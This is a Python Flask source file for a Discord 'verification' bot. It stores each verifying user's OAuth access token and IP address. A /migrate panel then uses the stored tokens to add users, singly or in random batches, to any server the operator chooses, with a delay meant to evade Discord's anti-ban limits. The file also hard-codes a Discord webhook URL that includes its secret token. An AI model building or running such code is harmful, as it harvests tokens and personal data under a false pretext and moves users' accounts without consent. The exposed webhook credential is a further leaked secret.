import os
import time
import random
import requests
import psycopg2
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL") 
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"
API_BASE = "https://discord.com/api/v10"

# --- BANCO DE DADOS ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                ip_address VARCHAR(50),
                access_token TEXT,
                guild_id VARCHAR(50),
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Erro DB: {e}")

def save_user_to_db(user_id, username, ip, token, guild_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        query = """
            INSERT INTO verified_users (user_id, username, ip_address, access_token, guild_id)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE 
            SET ip_address = EXCLUDED.ip_address, 
                access_token = EXCLUDED.access_token,
                guild_id = EXCLUDED.guild_id,
                verified_at = CURRENT_TIMESTAMP;
        """
        cur.execute(query, (user_id, username, ip, token, guild_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro save DB: {e}")

# --- FUNÇÕES DISCORD ---
def get_headers_bot():
    return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

def join_user_to_guild(user_id, access_token, target_guild_id):
    """Função core que move o usuário"""
    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
    data = {"access_token": access_token}
    
    # Tenta adicionar
    response = requests.put(url, headers=get_headers_bot(), json=data)
    
    # 201: Entrou agora / 204: Já estava lá / 403: Bot sem permissão
    return response.status_code

# --- ROTAS ---
init_db()

@app.route('/')
def index(): return "Hunter System Online."

@app.route('/ping')
def ping(): return "Pong", 200

@app.route('/auth')
def auth():
    target_guild_id = request.args.get('guild_id')
    if not target_guild_id: return "Erro: ID server faltando."
    return redirect(f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds&state={target_guild_id}")

@app.route('/callback')
def callback():
    code = request.args.get('code')
    target_guild_id = request.args.get('state') 
    if not code: return "Erro Code."

    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    tokens = token_resp.json()
    access_token = tokens.get('access_token')
    
    user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_resp.json()
    user_id = user_data['id']
    username = user_data['username']

    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    
    save_user_to_db(user_id, username, ip, access_token, target_guild_id)
    join_user_to_guild(user_id, access_token, target_guild_id) # Já adiciona no servidor original

    return redirect(f"https://discord.com/channels/{target_guild_id}")

# --- PAINEL DE ENVIO (Painel 1) ---
@app.route('/painel', methods=['GET', 'POST'])
def painel():
    # ... (Código do painel de envio que já fizemos) ...
    return render_template('painel.html') 

# --- NOVO: PAINEL DE MIGRAÇÃO (Painel 2) ---
@app.route('/migrate', methods=['GET', 'POST'])
def migrate():
    log_msg = []
    
    if request.method == 'POST':
        action_type = request.form.get('action_type') # 'single' ou 'mass'
        target_guild_id = request.form.get('target_guild_id')
        
        conn = get_db_connection()
        cur = conn.cursor()

        try:
            # MODO 1: INDIVIDUAL (ID ou Nick)
            if action_type == 'single':
                identifier = request.form.get('identifier') # Pode ser ID ou Username
                
                # Tenta achar por ID primeiro
                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s", (identifier,))
                user = cur.fetchone()
                
                # Se não achar por ID, tenta por Username
                if not user:
                    cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE username = %s", (identifier,))
                    user = cur.fetchone()

                if user:
                    uid, uname, token = user
                    status = join_user_to_guild(uid, token, target_guild_id)
                    if status in [201, 204]:
                        log_msg.append(f"✅ Sucesso: {uname} ({uid}) adicionado.")
                    else:
                        log_msg.append(f"❌ Falha: {uname} (Status: {status} - Token expirado ou Bot sem perm).")
                else:
                    log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado no Banco de Dados.")

            # MODO 2: EM MASSA (Quantidade)
            elif action_type == 'mass':
                amount = int(request.form.get('amount'))
                
                # Pega X usuários aleatórios ou os mais recentes
                # ORDER BY random() pega aleatórios
                cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                users = cur.fetchall()
                
                success_count = 0
                for user in users:
                    uid, uname, token = user
                    status = join_user_to_guild(uid, token, target_guild_id)
                    
                    if status in [201, 204]:
                        success_count += 1
                        print(f"Migrado: {uname}")
                    
                    # Delay anti-ban do Discord
                    time.sleep(0.5) 

                log_msg.append(f"🚀 Processo finalizado. {success_count}/{len(users)} usuários migrados com sucesso.")

        except Exception as e:
            log_msg.append(f"Erro Crítico: {str(e)}")
        finally:
            conn.close()

    return render_template('migration.html', logs=log_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
